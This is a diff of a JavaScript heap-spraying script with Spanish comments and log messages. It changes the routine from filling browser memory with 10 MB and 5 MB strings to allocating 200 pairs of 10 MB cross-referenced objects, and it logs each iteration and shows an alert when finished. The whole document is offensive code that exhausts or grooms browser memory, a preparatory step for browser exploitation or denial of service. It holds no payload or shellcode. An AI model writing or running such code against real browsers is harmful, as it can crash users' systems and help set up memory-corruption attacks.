@@ -1,22 +1,17 @@
 (function() {
     const sprayArray = [];
-    const largeObjectSize = 0xA00000;  // 10 MB por objeto grande
-    const smallObjectSize = 0x500000;  // 5 MB por objeto pequeño
-    const totalIterations = 200;       // Aumentar número de objetos para una carga más intensa
+    const largeObjectSize = 0xA00000;  // 10 MB
+    
+    for (let i = 0; i < 200; i++) {
+        // Crear objetos grandes con referencias cruzadas
+        let obj1 = { data: "A".repeat(largeObjectSize) };
+        let obj2 = { data: "B".repeat(largeObjectSize), ref: obj1 };
+        obj1.ref = obj2;  // Referencia cruzada
 
-    console.log("[+] Iniciando heap spraying intensivo...");
+        sprayArray.push(obj1, obj2);
 
-    for (let i = 0; i < totalIterations; i++) {
-        // Crear objetos grandes y pequeños sin pausas para llenar la memoria rápidamente
-        let largeObject = "A".repeat(largeObjectSize);
-        let smallObject = "B".repeat(smallObjectSize);
-        
-        sprayArray.push(largeObject, smallObject);
-
-        // Registro en cada iteración para seguimiento en el navegador
-        console.log(`[+] Iteración ${i + 1}: Objetos grandes y pequeños añadidos al heap.`);
+        console.log(`[+] Iteración ${i + 1}: Objetos grandes y cruzados añadidos.`);
     }
-
-    console.log("[+] Heap spraying intensivo completado. La memoria está saturada de objetos.");
-    alert("Heap spraying intensivo completado. Verifica el estado del sistema.");
+    console.log("[+] Heap spraying con referencias cruzadas completado.");
+    alert("Heap spraying intensivo con referencias cruzadas completado.");
 })();
